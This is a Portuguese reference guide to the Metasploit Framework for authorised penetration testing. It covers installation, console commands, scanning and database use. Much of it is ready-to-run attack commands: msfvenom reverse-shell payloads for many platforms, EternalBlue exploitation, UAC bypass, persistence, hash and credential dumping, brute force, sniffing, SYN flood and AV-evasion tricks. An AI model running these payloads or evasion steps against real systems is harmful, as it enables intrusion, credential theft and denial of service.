# 🔴 Metasploit Framework — guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![Licença](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **A framework de testes de intrusão mais utilizada no mundo** - O teu guia completo para dominar o Metasploit

> **Termos usados:** pentest significa teste de intrusão; exploit é código que explora uma vulnerabilidade; payload é a carga executada; listener é um processo à escuta. Pós-exploração refere-se às ações após o acesso inicial. Mantêm-se os nomes técnicos e os literais dos exemplos; a disponibilidade de módulos e opções depende da versão e da plataforma.

> **Precisão do original:** as quantidades de módulos no diagrama são aproximadas. Codificação não equivale a cifragem nem garante evasão do antivírus: os encoders destinam-se sobretudo a tratar caracteres problemáticos. As recomendações de múltiplas codificações e de payloads codificados não garantem o resultado descrito. Ver [Rapid7: limites dos encoders](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/). A nomenclatura, arquitetura e ligação devem corresponder ao payload efetivo: [como funcionam os payloads](https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html). O comando de instalação com o ficheiro `.erb` segue o exemplo oficial de [instaladores nightly](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html); não foi executado nesta tradução.

---

## 📋 Índice

- [Introdução](#-introduction)
- [Instalação](#-installation)
- [Visão geral da arquitetura](#-architecture-overview)
- [Iniciar o Metasploit](#-starting-metasploit)
- [Comandos básicos](#-basic-commands)
- [Tipos de módulos](#-module-types)
- [Fluxo de exploração](#-exploitation-workflow)
- [Integração com a base de dados](#-database-integration)
- [Análise e enumeração](#-scanning--enumeration)
- [Geração de payloads (msfvenom)](#-payload-generation-msfvenom)
- [Pós-exploração](#-post-exploitation)
- [Módulos auxiliares](#-auxiliary-modules)
- [Exemplos práticos](#-real-world-examples)
- [Tabelas de referência rápida](#-quick-reference-tables)
- [Conselhos e boas práticas](#-tips--best-practices)
- [Recursos](#-resources)

---

<a id="-introduction"></a>
## 🎯 Introdução

O **Metasploit Framework** é uma plataforma de código aberto para testes de intrusão e desenvolvimento de exploits. Disponibiliza:

- 🔍 **Recolha de informações** e análise de vulnerabilidades
- 💉 **Desenvolvimento de exploits** e entrega
- 🎭 **Geração de payloads** para várias plataformas
- 🔐 Ferramentas e técnicas de **pós-exploração**
- 📊 **Relatórios** e funcionalidades de documentação

### Componentes principais

| Componente | Descrição |
|-----------|-------------|
| `msfconsole` | Interface principal de linha de comandos |
| `msfvenom` | Gerador e codificador de payloads |
| `msfdb` | Utilitário de gestão da base de dados |
| `msfrpcd` | Serviço RPC para acesso remoto |

---

<a id="-installation"></a>
## 📥 Instalação

### Kali Linux (pré-instalado)
```bash
# Atualizar o Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Instalar dependências
sudo apt install curl gnupg2 software-properties-common

# Adicionar o repositório do Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (não recomendado para produção)
```powershell
# Descarregar o instalador de: https://windows.metasploit.com/
# Executar o instalador e seguir as instruções
```

---

<a id="-architecture-overview"></a>
## 🏗️ Visão geral da arquitetura

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIAR  │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ CODIFIC. │  │   NOPS   │  │ EVASÃO   │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      INTERFACES                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 BASE DE DADOS (PostgreSQL)                   │
└─────────────────────────────────────────────────────────────┘
```

### Estrutura de pastas
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Módulos de exploração
│   ├── payloads/      # Módulos de payloads
│   ├── auxiliary/     # Análise, fuzzing, etc.
│   ├── post/          # Pós-exploração
│   ├── encoders/      # Codificadores de payloads
│   ├── nops/          # Geradores de NOPs
│   └── evasion/       # Módulos de evasão de antivírus
├── tools/             # Ferramentas adicionais
├── scripts/           # Scripts Meterpreter
├── data/              # Listas de palavras e modelos
└── plugins/           # Plugins da consola
```

---

<a id="-starting-metasploit"></a>
## 🚀 Iniciar o Metasploit

### Inicializar a base de dados (primeira utilização)
```bash
# Iniciar o serviço PostgreSQL
sudo systemctl start postgresql

# Inicializar a base de dados
sudo msfdb init

# Verificar o estado da base de dados
sudo msfdb status
```

### Iniciar msfconsole
```bash
# Início normal
msfconsole

# Modo silencioso (sem banner)
msfconsole -q

# Executar comandos ao iniciar
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Carregar um ficheiro de recursos
msfconsole -r commands.rc
```

---

<a id="-basic-commands"></a>
## ⌨️ Comandos básicos

### Navegação e ajuda

| Comando | Descrição |
|---------|-------------|
| `help` ou `?` | Apresentar o menu de ajuda |
| `help <command>` | Ajuda para um comando específico |
| `search <term>` | Pesquisar módulos por nome/CVE/plataforma |
| `use <module>` | Selecionar um módulo |
| `back` | Sair do módulo atual |
| `info` | Apresentar informações do módulo |
| `show options` | Mostrar opções do módulo |
| `show advanced` | Mostrar opções avançadas |
| `show payloads` | Listar payloads compatíveis |
| `show targets` | Listar alvos disponíveis |

### Configuração do módulo

```bash
# Definir opções
set RHOSTS 192.168.1.100          # IP do alvo
set RPORT 445                      # Porta do alvo
set LHOST 192.168.1.50            # IP local (atacante)
set LPORT 4444                     # Porta local (listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Definir globalmente (mantém-se entre módulos)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Remover opções
unset RHOSTS
unsetg LHOST

# Verificar as definições atuais
show options
check                              # Verificar se o alvo é vulnerável
```

### Execução

```bash
# Executar o exploit
exploit
run

# Executar em segundo plano
exploit -j

# Executar com opções específicas
exploit -z                         # Não interagir com a sessão após o êxito
```

### Gestão de sessões

```bash
# Listar sessões
sessions
sessions -l

# Interagir com a sessão
sessions -i 1

# Terminar a sessão
sessions -k 1

# Terminar todas as sessões
sessions -K

# Converter uma shell numa sessão Meterpreter
sessions -u 1

# Executar um comando em todas as sessões
sessions -c "sysinfo"
```

---

<a id="-module-types"></a>
## 📦 Tipos de módulos

### 1. Exploits
Módulos que exploram vulnerabilidades.

```bash
# Procurar exploits
search type:exploit platform:windows

# Exemplo
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Código executado após uma exploração bem-sucedida.

**Tipos:**
- **Singles** - Payloads autónomos
- **Stagers** - Estabelecem a ligação entre atacante e alvo
- **Stages** - Descarregados pelos stagers (Meterpreter)

```bash
# Listar payloads
show payloads

# Convenção de nomes de payloads
<platform>/<arch>/<type>/<connection>
# Exemplo: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliares
Análise, fuzzing, captura de tráfego e outras funções.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Módulos de pós-exploração.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Codificadores
Codificar payloads para evitar a deteção.

```bash
show encoders
# Exemplo: x86/shikata_ga_nai
```

---

<a id="-exploitation-workflow"></a>
## 🎯 Fluxo de exploração

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON. E   │───▶│    SELECIONAR│───▶│  CONFIGURAR  │
│  ENUMERAÇÃO  │    │    MÓDULO    │    │   OPÇÕES     │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    PÓS-      │◀───│   EXPLORAR   │◀───│    VERIFICAR │
│ EXPLORAÇÃO   │    │    ALVO      │    │    ALVO      │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Exemplo passo a passo

```bash
# 1. Procurar um exploit
msf6 > search eternalblue

# 2. Selecionar um módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Ver as opções
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Definir o alvo
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Definir o payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Definir o listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verificar a vulnerabilidade (opcional)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Executar
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-database-integration"></a>
## 🗄️ Integração com a base de dados

### Preparação e ligação

```bash
# Inicializar a base de dados
msfdb init

# Ligar à base de dados
db_connect msf:password@127.0.0.1/msf

# Verificar o estado
db_status

# Desligar
db_disconnect
```

### Gestão de áreas de trabalho

```bash
# Listar áreas de trabalho
workspace

# Criar uma área de trabalho
workspace -a pentest_project

# Mudar de área de trabalho
workspace pentest_project

# Eliminar uma área de trabalho
workspace -d old_project

# Mudar o nome de uma área de trabalho
workspace -r old_name new_name
```

### Gestão de sistemas

```bash
# Listar sistemas
hosts

# Adicionar um sistema manualmente
hosts -a 192.168.1.100

# Eliminar um sistema
hosts -d 192.168.1.100

# Pesquisar sistemas
hosts -S windows

# Exportar sistemas
hosts -o /tmp/hosts.csv
```

### Gestão de serviços

```bash
# Listar serviços
services

# Filtrar por porta
services -p 80,443

# Filtrar pelo nome do serviço
services -s http

# Pesquisar serviços
services -S microsoft
```

### Gestão de vulnerabilidades

```bash
# Listar vulnerabilidades
vulns

# Adicionar uma vulnerabilidade
vulns -a 192.168.1.100 -n "MS17-010"
```

### Importação/exportação

```bash
# Importar uma análise Nmap
db_import /path/to/nmap_scan.xml

# Importar uma análise Nessus
db_import /path/to/nessus_scan.nessus

# Executar o Nmap diretamente
db_nmap -sV -O 192.168.1.0/24

# Exportar dados
hosts -o hosts.csv
services -o services.csv
```

---

<a id="-scanning--enumeration"></a>
## 🔍 Análise e enumeração

### Análise de portas

```bash
# Análise TCP SYN
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# Análise por ligação TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Enumeração de serviços

```bash
# Enumeração SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Partilhas SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# Versão de SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# Versão de HTTP
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Enumeração FTP
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Análise de vulnerabilidades

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Analisador de vulnerabilidades HTTP
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

<a id="-payload-generation-msfvenom"></a>
## 💉 Geração de payloads (msfvenom)

### Sintaxe básica
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Opções comuns

| Opção | Descrição |
|--------|-------------|
| `-p` | Payload a utilizar |
| `-f` | Formato de saída |
| `-o` | Ficheiro de saída |
| `-e` | Codificador a utilizar |
| `-i` | Iterações de codificação |
| `-b` | Caracteres problemáticos a evitar |
| `-n` | Tamanho da sequência de NOPs |
| `--platform` | Plataforma alvo |
| `-a` | Arquitetura |
| `LHOST` | IP do listener |
| `LPORT` | Porta do listener |

### Payloads Windows

```bash
# TCP inverso (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# TCP inverso (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# HTTPS inverso (cifrado)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# TCP à escuta no alvo
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Com codificação (evasão de antivírus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Payloads Linux

```bash
# TCP inverso
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# TCP inverso (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Shell à escuta no alvo
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Payloads Web

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Reverse shell ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Reverse shell ASPX
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Reverse shell JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# Ficheiro WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Payloads em linguagens de script

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Payloads Android

```bash
# TCP inverso Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### Payloads macOS

```bash
# TCP inverso macOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Preparação do Multi/Handler

```bash
# Iniciar o listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

<a id="-post-exploitation"></a>
## 🔓 Pós-exploração

### Módulos básicos de pós-exploração

```bash
# Obter informações do sistema
use post/windows/gather/enum_system

# Obter os utilizadores com sessão iniciada
use post/windows/gather/enum_logged_on_users

# Extrair hashes de palavras-passe
use post/windows/gather/hashdump

# Credenciais da memória
use post/windows/gather/credentials/credential_collector

# Verificar a existência de máquina virtual
use post/windows/gather/checkvm
```

### Escalada de privilégios

```bash
# Sugestão de escalada de privilégios em Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Contornar o UAC
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Obter SYSTEM
use post/windows/escalate/getsystem
```

### Persistência

```bash
# Persistência no registo
use exploit/windows/local/persistence_service
set SESSION 1
run

# Persistência através de tarefa agendada
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

<a id="-auxiliary-modules"></a>
## 🔧 Módulos auxiliares

### Força bruta

```bash
# Força bruta em SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# Força bruta em SMB
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Força bruta em FTP
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Captura de tráfego

```bash
# Captura de palavras-passe HTTP
use auxiliary/sniffer/psnuffle
run

# Capturar pacotes
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (apenas para testes)

```bash
# Inundação SYN
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

<a id="-real-world-examples"></a>
## 🎬 Exemplos práticos

### Exemplo 1: ataque EternalBlue (MS17-010)

```bash
# Iniciar o Metasploit
msfconsole -q

# Procurar um exploit
search eternalblue

# Utilizar o exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Verificar se é vulnerável
check

# Explorar
exploit
```

### Exemplo 2: ataque a uma aplicação Web

```bash
# Procurar vulnerabilidades
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Explorar o carregamento de ficheiros
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Exemplo 3: Multi-Handler com msfvenom

```bash
# Terminal 1: gerar o payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: iniciar o handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Transferir payload.exe para o alvo e executar
# A sessão irá ligar-se ao handler
```

### Exemplo 4: pivoting através de um sistema comprometido

```bash
# Após obter uma sessão Meterpreter
meterpreter > run autoroute -s 10.10.10.0/24

# Ou a partir de msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Analisar agora a rede interna
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

<a id="-quick-reference-tables"></a>
## 📊 Tabelas de referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `search <term>` | Pesquisar módulos |
| `use <module>` | Selecionar módulo |
| `show options` | Apresentar opções |
| `set <opt> <val>` | Definir o valor de uma opção |
| `exploit` / `run` | Executar o módulo |
| `back` | Voltar ao contexto principal |
| `sessions -l` | Listar sessões |
| `sessions -i <id>` | Interagir com a sessão |

### Payloads comuns

| Payload | Descrição |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter (32-bit) |
| `windows/x64/meterpreter/reverse_tcp` | Windows Meterpreter (64-bit) |
| `windows/meterpreter/reverse_https` | Ligação cifrada |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java/JSP shell |
| `android/meterpreter/reverse_tcp` | Android Meterpreter |

### Formatos de saída (msfvenom)

| Formato | Extensão | Caso de utilização |
|--------|-----------|----------|
| `exe` | .exe | Executável Windows |
| `elf` | (nenhuma) | Executável Linux |
| `macho` | (nenhuma) | Executável macOS |
| `raw` | variável | Shellcode em bruto |
| `asp` | .asp | Servidor Web IIS |
| `aspx` | .aspx | Servidor Web .NET |
| `php` | .php | Servidor Web PHP |
| `jsp` | .jsp | Servidor Web Java |
| `war` | .war | Implementação em Tomcat |
| `psh` | .ps1 | Script PowerShell |
| `vba` | .vba | Macro do Office |
| `dll` | .dll | Biblioteca Windows |

### Codificadores populares

| Codificador | Descrição |
|---------|-------------|
| `x86/shikata_ga_nai` | Codificador XOR polimórfico |
| `x64/xor` | Codificador XOR (64-bit) |
| `x86/alpha_mixed` | Codificador alfanumérico |
| `php/base64` | Codificador PHP Base64 |

---

<a id="-tips--best-practices"></a>
## 💡 Conselhos e boas práticas

### ⚠️ Aviso legal
> **IMPORTANTE:** Utiliza o Metasploit apenas em sistemas que te pertençam ou para os quais tenhas autorização escrita explícita para testar. O acesso não autorizado a sistemas informáticos é ilegal.

### Conselhos de desempenho

1. **Utilizar a base de dados**
   ```bash
   # Inicializar e utilizar sempre a base de dados
   msfdb init
   db_status
   ```

2. **Utilizar áreas de trabalho**
   ```bash
   workspace -a client_pentest
   ```

3. **Scripts de recursos**
   ```bash
   # Guardar os comandos num ficheiro .rc
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Executar o script
   msfconsole -r handler.rc
   ```

4. **Utilizar as threads com ponderação**
   ```bash
   set THREADS 10  # Não sobrecarregar o alvo
   ```

### Técnicas de evasão

1. **Codificações múltiplas**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Modelos personalizados**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Utilizar payloads HTTPS**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Resolução de problemas

| Problema | Solução |
|-------|----------|
| A base de dados não estabelece ligação | `msfdb reinit` |
| O módulo não carrega | `reload_all` |
| A sessão termina imediatamente | Verificar o antivírus e utilizar um payload codificado |
| O exploit falha | Verificar a versão do sistema operativo e experimentar outro alvo |

---

<a id="-resources"></a>
## 📚 Recursos

### Documentação oficial
- [Metasploit Docs](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

### Recursos de aprendizagem
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Guias de referência
- [SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Guia de referência do Meterpreter](./Meterpreter.pt.md)

---

## 📄 Licença

Este guia destina-se apenas a fins educativos. Utiliza-o de forma responsável e ética.

---

<p align="center">
  <b>Bom hacking! 🔴</b><br>
  <i>Lembra-te: um grande poder implica uma grande responsabilidade</i>
</p>
